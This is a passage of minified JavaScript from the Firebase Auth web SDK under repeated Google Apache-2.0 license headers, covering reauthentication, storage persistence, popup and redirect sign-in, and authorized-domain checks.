 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vl extends xn{constructor(e,n,r,i){var s;super(n.code,n.message),this.operationType=r,this.user=i,Object.setPrototypeOf(this,vl.prototype),this.customData={appName:e.name,tenantId:(s=e.tenantId)!==null&&s!==void 0?s:void 0,_serverResponse:n.customData._serverResponse,operationType:r}}static _fromErrorAndOperation(e,n,r,i){return new vl(e,n,r,i)}}function g0(t,e,n,r){return(e==="reauthenticate"?n._getReauthenticationResolver(t):n._getIdTokenResponse(t)).catch(s=>{throw s.code==="auth/multi-factor-auth-required"?vl._fromErrorAndOperation(t,s,e,r):s})}async function $C(t,e,n=!1){const r=await ao(t,e._linkToIdToken(t.auth,await t.getIdToken()),n);return Ni._forOperation(t,"link",r)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function WC(t,e,n=!1){const{auth:r}=t;if(qn(r.app))return Promise.reject(xr(r));const i="reauthenticate";try{const s=await ao(t,g0(r,i,e,t),n);Y(s.idToken,r,"internal-error");const o=qd(s.idToken);Y(o,r,"internal-error");const{sub:l}=o;return Y(t.uid===l,r,"user-mismatch"),Ni._forOperation(t,i,s)}catch(s){throw(s==null?void 0:s.code)==="auth/user-not-found"&&In(r,"user-mismatch"),s}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function qC(t,e,n=!1){if(qn(t.app))return Promise.reject(xr(t));const r="signIn",i=await g0(t,r,e),s=await Ni._fromIdTokenResponse(t,r,i);return n||await t._updateCurrentUser(s.user),s}function HC(t,e,n,r){return at(t).onIdTokenChanged(e,n,r)}function GC(t,e,n){return at(t).beforeAuthStateChanged(e,n)}const _l="__sak";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class y0{constructor(e,n){this.storageRetriever=e,this.type=n}_isAvailable(){try{return this.storage?(this.storage.setItem(_l,"1"),this.storage.removeItem(_l),Promise.resolve(!0)):Promise.resolve(!1)}catch{return Promise.resolve(!1)}}_set(e,n){return this.storage.setItem(e,JSON.stringify(n)),Promise.resolve()}_get(e){const n=this.storage.getItem(e);return Promise.resolve(n?JSON.parse(n):null)}_remove(e){return this.storage.removeItem(e),Promise.resolve()}get storage(){return this.storageRetriever()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const KC=1e3,QC=10;class v0 extends y0{constructor(){super(()=>window.localStorage,"LOCAL"),this.boundEventHandler=(e,n)=>this.onStorageEvent(e,n),this.listeners={},this.localCache={},this.pollTimer=null,this.fallbackToPolling=h0(),this._shouldAllowMigration=!0}forAllChangedKeys(e){for(const n of Object.keys(this.listeners)){const r=this.storage.getItem(n),i=this.localCache[n];r!==i&&e(n,i,r)}}onStorageEvent(e,n=!1){if(!e.key){this.forAllChangedKeys((o,l,u)=>{this.notifyListeners(o,u)});return}const r=e.key;n?this.detachListener():this.stopPolling();const i=()=>{const o=this.storage.getItem(r);!n&&this.localCache[r]===o||this.notifyListeners(r,o)},s=this.storage.getItem(r);RC()&&s!==e.newValue&&e.newValue!==e.oldValue?setTimeout(i,QC):i()}notifyListeners(e,n){this.localCache[e]=n;const r=this.listeners[e];if(r)for(const i of Array.from(r))i(n&&JSON.parse(n))}startPolling(){this.stopPolling(),this.pollTimer=setInterval(()=>{this.forAllChangedKeys((e,n,r)=>{this.onStorageEvent(new StorageEvent("storage",{key:e,oldValue:n,newValue:r}),!0)})},KC)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}attachListener(){window.addEventListener("storage",this.boundEventHandler)}detachListener(){window.removeEventListener("storage",this.boundEventHandler)}_addListener(e,n){Object.keys(this.listeners).length===0&&(this.fallbackToPolling?this.startPolling():this.attachListener()),this.listeners[e]||(this.listeners[e]=new Set,this.localCache[e]=this.storage.getItem(e)),this.listeners[e].add(n)}_removeListener(e,n){this.listeners[e]&&(this.listeners[e].delete(n),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&(this.detachListener(),this.stopPolling())}async _set(e,n){await super._set(e,n),this.localCache[e]=JSON.stringify(n)}async _get(e){const n=await super._get(e);return this.localCache[e]=JSON.stringify(n),n}async _remove(e){await super._remove(e),delete this.localCache[e]}}v0.type="LOCAL";const YC=v0;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class _0 extends y0{constructor(){super(()=>window.sessionStorage,"SESSION")}_addListener(e,n){}_removeListener(e,n){}}_0.type="SESSION";const w0=_0;/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function XC(t){return Promise.all(t.map(async e=>{try{return{fulfilled:!0,value:await e}}catch(n){return{fulfilled:!1,reason:n}}}))}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Kl{constructor(e){this.eventTarget=e,this.handlersMap={},this.boundEventHandler=this.handleEvent.bind(this)}static _getInstance(e){const n=this.receivers.find(i=>i.isListeningto(e));if(n)return n;const r=new Kl(e);return this.receivers.push(r),r}isListeningto(e){return this.eventTarget===e}async handleEvent(e){const n=e,{eventId:r,eventType:i,data:s}=n.data,o=this.handlersMap[i];if(!(o!=null&&o.size))return;n.ports[0].postMessage({status:"ack",eventId:r,eventType:i});const l=Array.from(o).map(async h=>h(n.origin,s)),u=await XC(l);n.ports[0].postMessage({status:"done",eventId:r,eventType:i,response:u})}_subscribe(e,n){Object.keys(this.handlersMap).length===0&&this.eventTarget.addEventListener("message",this.boundEventHandler),this.handlersMap[e]||(this.handlersMap[e]=new Set),this.handlersMap[e].add(n)}_unsubscribe(e,n){this.handlersMap[e]&&n&&this.handlersMap[e].delete(n),(!n||this.handlersMap[e].size===0)&&delete this.handlersMap[e],Object.keys(this.handlersMap).length===0&&this.eventTarget.removeEventListener("message",this.boundEventHandler)}}Kl.receivers=[];/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Qd(t="",e=10){let n="";for(let r=0;r<e;r++)n+=Math.floor(Math.random()*10);return t+n}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class JC{constructor(e){this.target=e,this.handlers=new Set}removeMessageHandler(e){e.messageChannel&&(e.messageChannel.port1.removeEventListener("message",e.onMessage),e.messageChannel.port1.close()),this.handlers.delete(e)}async _send(e,n,r=50){const i=typeof MessageChannel<"u"?new MessageChannel:null;if(!i)throw new Error("connection_unavailable");let s,o;return new Promise((l,u)=>{const h=Qd("",20);i.port1.start();const f=setTimeout(()=>{u(new Error("unsupported_event"))},r);o={messageChannel:i,onMessage(p){const g=p;if(g.data.eventId===h)switch(g.data.status){case"ack":clearTimeout(f),s=setTimeout(()=>{u(new Error("timeout"))},3e3);break;case"done":clearTimeout(s),l(g.data.response);break;default:clearTimeout(f),clearTimeout(s),u(new Error("invalid_response"));break}}},this.handlers.add(o),i.port1.addEventListener("message",o.onMessage),this.target.postMessage({eventType:e,eventId:h,data:n},[i.port2])}).finally(()=>{o&&this.removeMessageHandler(o)})}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Jt(){return window}function ZC(t){Jt().location.href=t}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function E0(){return typeof Jt().WorkerGlobalScope<"u"&&typeof Jt().importScripts=="function"}async function eR(){if(!(navigator!=null&&navigator.serviceWorker))return null;try{return(await navigator.serviceWorker.ready).active}catch{return null}}function tR(){var t;return((t=navigator==null?void 0:navigator.serviceWorker)===null||t===void 0?void 0:t.controller)||null}function nR(){return E0()?self:null}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const T0="firebaseLocalStorageDb",rR=1,wl="firebaseLocalStorage",I0="fbase_key";class Co{constructor(e){this.request=e}toPromise(){return new Promise((e,n)=>{this.request.addEventListener("success",()=>{e(this.request.result)}),this.request.addEventListener("error",()=>{n(this.request.error)})})}}function Ql(t,e){return t.transaction([wl],e?"readwrite":"readonly").objectStore(wl)}function iR(){const t=indexedDB.deleteDatabase(T0);return new Co(t).toPromise()}function Ih(){const t=indexedDB.open(T0,rR);return new Promise((e,n)=>{t.addEventListener("error",()=>{n(t.error)}),t.addEventListener("upgradeneeded",()=>{const r=t.result;try{r.createObjectStore(wl,{keyPath:I0})}catch(i){n(i)}}),t.addEventListener("success",async()=>{const r=t.result;r.objectStoreNames.contains(wl)?e(r):(r.close(),await iR(),e(await Ih()))})})}async function fg(t,e,n){const r=Ql(t,!0).put({[I0]:e,value:n});return new Co(r).toPromise()}async function sR(t,e){const n=Ql(t,!1).get(e),r=await new Co(n).toPromise();return r===void 0?null:r.value}function pg(t,e){const n=Ql(t,!0).delete(e);return new Co(n).toPromise()}const oR=800,aR=3;class S0{constructor(){this.type="LOCAL",this._shouldAllowMigration=!0,this.listeners={},this.localCache={},this.pollTimer=null,this.pendingWrites=0,this.receiver=null,this.sender=null,this.serviceWorkerReceiverAvailable=!1,this.activeServiceWorker=null,this._workerInitializationPromise=this.initializeServiceWorkerMessaging().then(()=>{},()=>{})}async _openDb(){return this.db?this.db:(this.db=await Ih(),this.db)}async _withRetries(e){let n=0;for(;;)try{const r=await this._openDb();return await e(r)}catch(r){if(n++>aR)throw r;this.db&&(this.db.close(),this.db=void 0)}}async initializeServiceWorkerMessaging(){return E0()?this.initializeReceiver():this.initializeSender()}async initializeReceiver(){this.receiver=Kl._getInstance(nR()),this.receiver._subscribe("keyChanged",async(e,n)=>({keyProcessed:(await this._poll()).includes(n.key)})),this.receiver._subscribe("ping",async(e,n)=>["keyChanged"])}async initializeSender(){var e,n;if(this.activeServiceWorker=await eR(),!this.activeServiceWorker)return;this.sender=new JC(this.activeServiceWorker);const r=await this.sender._send("ping",{},800);r&&!((e=r[0])===null||e===void 0)&&e.fulfilled&&!((n=r[0])===null||n===void 0)&&n.value.includes("keyChanged")&&(this.serviceWorkerReceiverAvailable=!0)}async notifyServiceWorker(e){if(!(!this.sender||!this.activeServiceWorker||tR()!==this.activeServiceWorker))try{await this.sender._send("keyChanged",{key:e},this.serviceWorkerReceiverAvailable?800:50)}catch{}}async _isAvailable(){try{if(!indexedDB)return!1;const e=await Ih();return await fg(e,_l,"1"),await pg(e,_l),!0}catch{}return!1}async _withPendingWrite(e){this.pendingWrites++;try{await e()}finally{this.pendingWrites--}}async _set(e,n){return this._withPendingWrite(async()=>(await this._withRetries(r=>fg(r,e,n)),this.localCache[e]=n,this.notifyServiceWorker(e)))}async _get(e){const n=await this._withRetries(r=>sR(r,e));return this.localCache[e]=n,n}async _remove(e){return this._withPendingWrite(async()=>(await this._withRetries(n=>pg(n,e)),delete this.localCache[e],this.notifyServiceWorker(e)))}async _poll(){const e=await this._withRetries(i=>{const s=Ql(i,!1).getAll();return new Co(s).toPromise()});if(!e)return[];if(this.pendingWrites!==0)return[];const n=[],r=new Set;if(e.length!==0)for(const{fbase_key:i,value:s}of e)r.add(i),JSON.stringify(this.localCache[i])!==JSON.stringify(s)&&(this.notifyListeners(i,s),n.push(i));for(const i of Object.keys(this.localCache))this.localCache[i]&&!r.has(i)&&(this.notifyListeners(i,null),n.push(i));return n}notifyListeners(e,n){this.localCache[e]=n;const r=this.listeners[e];if(r)for(const i of Array.from(r))i(n)}startPolling(){this.stopPolling(),this.pollTimer=setInterval(async()=>this._poll(),oR)}stopPolling(){this.pollTimer&&(clearInterval(this.pollTimer),this.pollTimer=null)}_addListener(e,n){Object.keys(this.listeners).length===0&&this.startPolling(),this.listeners[e]||(this.listeners[e]=new Set,this._get(e)),this.listeners[e].add(n)}_removeListener(e,n){this.listeners[e]&&(this.listeners[e].delete(n),this.listeners[e].size===0&&delete this.listeners[e]),Object.keys(this.listeners).length===0&&this.stopPolling()}}S0.type="LOCAL";const lR=S0;new So(3e4,6e4);/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function uR(t,e){return e?mn(e):(Y(t._popupRedirectResolver,t,"argument-error"),t._popupRedirectResolver)}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Yd extends p0{constructor(e){super("custom","custom"),this.params=e}_getIdTokenResponse(e){return Ei(e,this._buildIdpRequest())}_linkToIdToken(e,n){return Ei(e,this._buildIdpRequest(n))}_getReauthenticationResolver(e){return Ei(e,this._buildIdpRequest())}_buildIdpRequest(e){const n={requestUri:this.params.requestUri,sessionId:this.params.sessionId,postBody:this.params.postBody,tenantId:this.params.tenantId,pendingToken:this.params.pendingToken,returnSecureToken:!0,returnIdpCredential:!0};return e&&(n.idToken=e),n}}function cR(t){return qC(t.auth,new Yd(t),t.bypassAuthState)}function hR(t){const{auth:e,user:n}=t;return Y(n,e,"internal-error"),WC(n,new Yd(t),t.bypassAuthState)}async function dR(t){const{auth:e,user:n}=t;return Y(n,e,"internal-error"),$C(n,new Yd(t),t.bypassAuthState)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class A0{constructor(e,n,r,i,s=!1){this.auth=e,this.resolver=r,this.user=i,this.bypassAuthState=s,this.pendingPromise=null,this.eventManager=null,this.filter=Array.isArray(n)?n:[n]}execute(){return new Promise(async(e,n)=>{this.pendingPromise={resolve:e,reject:n};try{this.eventManager=await this.resolver._initialize(this.auth),await this.onExecution(),this.eventManager.registerConsumer(this)}catch(r){this.reject(r)}})}async onAuthEvent(e){const{urlResponse:n,sessionId:r,postBody:i,tenantId:s,error:o,type:l}=e;if(o){this.reject(o);return}const u={auth:this.auth,requestUri:n,sessionId:r,tenantId:s||void 0,postBody:i||void 0,user:this.user,bypassAuthState:this.bypassAuthState};try{this.resolve(await this.getIdpTask(l)(u))}catch(h){this.reject(h)}}onError(e){this.reject(e)}getIdpTask(e){switch(e){case"signInViaPopup":case"signInViaRedirect":return cR;case"linkViaPopup":case"linkViaRedirect":return dR;case"reauthViaPopup":case"reauthViaRedirect":return hR;default:In(this.auth,"internal-error")}}resolve(e){Sn(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.resolve(e),this.unregisterAndCleanUp()}reject(e){Sn(this.pendingPromise,"Pending promise was never set"),this.pendingPromise.reject(e),this.unregisterAndCleanUp()}unregisterAndCleanUp(){this.eventManager&&this.eventManager.unregisterConsumer(this),this.pendingPromise=null,this.cleanUp()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const fR=new So(2e3,1e4);class di extends A0{constructor(e,n,r,i,s){super(e,n,i,s),this.provider=r,this.authWindow=null,this.pollId=null,di.currentPopupAction&&di.currentPopupAction.cancel(),di.currentPopupAction=this}async executeNotNull(){const e=await this.execute();return Y(e,this.auth,"internal-error"),e}async onExecution(){Sn(this.filter.length===1,"Popup operations only handle one event");const e=Qd();this.authWindow=await this.resolver._openPopup(this.auth,this.provider,this.filter[0],e),this.authWindow.associatedEvent=e,this.resolver._originValidation(this.auth).catch(n=>{this.reject(n)}),this.resolver._isIframeWebStorageSupported(this.auth,n=>{n||this.reject(Xt(this.auth,"web-storage-unsupported"))}),this.pollUserCancellation()}get eventId(){var e;return((e=this.authWindow)===null||e===void 0?void 0:e.associatedEvent)||null}cancel(){this.reject(Xt(this.auth,"cancelled-popup-request"))}cleanUp(){this.authWindow&&this.authWindow.close(),this.pollId&&window.clearTimeout(this.pollId),this.authWindow=null,this.pollId=null,di.currentPopupAction=null}pollUserCancellation(){const e=()=>{var n,r;if(!((r=(n=this.authWindow)===null||n===void 0?void 0:n.window)===null||r===void 0)&&r.closed){this.pollId=window.setTimeout(()=>{this.pollId=null,this.reject(Xt(this.auth,"popup-closed-by-user"))},8e3);return}this.pollId=window.setTimeout(e,fR.get())};e()}}di.currentPopupAction=null;/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const pR="pendingRedirect",La=new Map;class mR extends A0{constructor(e,n,r=!1){super(e,["signInViaRedirect","linkViaRedirect","reauthViaRedirect","unknown"],n,void 0,r),this.eventId=null}async execute(){let e=La.get(this.auth._key());if(!e){try{const r=await gR(this.resolver,this.auth)?await super.execute():null;e=()=>Promise.resolve(r)}catch(n){e=()=>Promise.reject(n)}La.set(this.auth._key(),e)}return this.bypassAuthState||La.set(this.auth._key(),()=>Promise.resolve(null)),e()}async onAuthEvent(e){if(e.type==="signInViaRedirect")return super.onAuthEvent(e);if(e.type==="unknown"){this.resolve(null);return}if(e.eventId){const n=await this.auth._redirectUserForId(e.eventId);if(n)return this.user=n,super.onAuthEvent(e);this.resolve(null)}}async onExecution(){}cleanUp(){}}async function gR(t,e){const n=_R(e),r=vR(t);if(!await r._isAvailable())return!1;const i=await r._get(n)==="true";return await r._remove(n),i}function yR(t,e){La.set(t._key(),e)}function vR(t){return mn(t._redirectPersistence)}function _R(t){return Oa(pR,t.config.apiKey,t.name)}async function wR(t,e,n=!1){if(qn(t.app))return Promise.reject(xr(t));const r=Gd(t),i=uR(r,e),o=await new mR(r,i,n).execute();return o&&!n&&(delete o.user._redirectEventId,await r._persistUserIfCurrent(o.user),await r._setRedirectUser(null,e)),o}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ER=10*60*1e3;class TR{constructor(e){this.auth=e,this.cachedEventUids=new Set,this.consumers=new Set,this.queuedRedirectEvent=null,this.hasHandledPotentialRedirect=!1,this.lastProcessedEventTime=Date.now()}registerConsumer(e){this.consumers.add(e),this.queuedRedirectEvent&&this.isEventForConsumer(this.queuedRedirectEvent,e)&&(this.sendToConsumer(this.queuedRedirectEvent,e),this.saveEventToCache(this.queuedRedirectEvent),this.queuedRedirectEvent=null)}unregisterConsumer(e){this.consumers.delete(e)}onEvent(e){if(this.hasEventBeenHandled(e))return!1;let n=!1;return this.consumers.forEach(r=>{this.isEventForConsumer(e,r)&&(n=!0,this.sendToConsumer(e,r),this.saveEventToCache(e))}),this.hasHandledPotentialRedirect||!IR(e)||(this.hasHandledPotentialRedirect=!0,n||(this.queuedRedirectEvent=e,n=!0)),n}sendToConsumer(e,n){var r;if(e.error&&!C0(e)){const i=((r=e.error.code)===null||r===void 0?void 0:r.split("auth/")[1])||"internal-error";n.onError(Xt(this.auth,i))}else n.onAuthEvent(e)}isEventForConsumer(e,n){const r=n.eventId===null||!!e.eventId&&e.eventId===n.eventId;return n.filter.includes(e.type)&&r}hasEventBeenHandled(e){return Date.now()-this.lastProcessedEventTime>=ER&&this.cachedEventUids.clear(),this.cachedEventUids.has(mg(e))}saveEventToCache(e){this.cachedEventUids.add(mg(e)),this.lastProcessedEventTime=Date.now()}}function mg(t){return[t.type,t.eventId,t.sessionId,t.tenantId].filter(e=>e).join("-")}function C0({type:t,error:e}){return t==="unknown"&&(e==null?void 0:e.code)==="auth/no-auth-event"}function IR(t){switch(t.type){case"signInViaRedirect":case"linkViaRedirect":case"reauthViaRedirect":return!0;case"unknown":return C0(t);default:return!1}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function SR(t,e={}){return Wi(t,"GET","/v1/projects",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const AR=/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,CR=/^https?/;async function RR(t){if(t.config.emulator)return;const{authorizedDomains:e}=await SR(t);for(const n of e)try{if(xR(n))return}catch{}In(t,"unauthorized-domain")}function xR(t){const e=Eh(),{protocol:n,hostname:r}=new URL(e);if(t.startsWith("chrome-extension://")){const o=new URL(t);return o.hostname===""&&r===""?n==="chrome-extension:"&&t.replace("chrome-extension://","")===e.replace("chrome-extension://",""):n==="chrome-extension:"&&o.hostname===r}if(!CR.test(n))return!1;if(AR.test(t))return r===t;const i=t.replace(/\./g,"\\.");return new RegExp("^(.+\\."+i+"|"+i+")$","i").test(r)}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const kR=new So(3e4,6e4);function gg(){const t=Jt().___jsl;if(t!=null&&t.H){for(const e of Object.keys(t.H))if(t.H[e].r=t.H[e].r||[],t.H[e].L=t.H[e].L||[],t.H[e].r=[...t.H[e].L],t.CP)for(let n=0;n<t.CP.length;n++)t.CP[n]=null}}function PR(t){return new Promise((e,n)=>{var r,i,s;function o(){gg(),gapi.load("gapi.iframes",{callback:()=>{e(gapi.iframes.getContext())},ontimeout:()=>{gg(),n(Xt(t,"network-request-failed"))},timeout:kR.get()})}if(!((i=(r=Jt().gapi)===null||r===void 0?void 0:r.iframes)===null||i===void 0)&&i.Iframe)e(gapi.iframes.getContext());else if(!((s=Jt().gapi)===null||s===void 0)&&s.load)o();else{const l=LC("iframefcb");return Jt()[l]=()=>{gapi.load?o():n(Xt(t,"network-request-failed"))},VC(`${OC()}?onload=${l}`).catch(u=>n(u))}}).catch(e=>{throw Ma=null,e})}let Ma=null;function NR(t){return Ma=Ma||PR(t),Ma}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
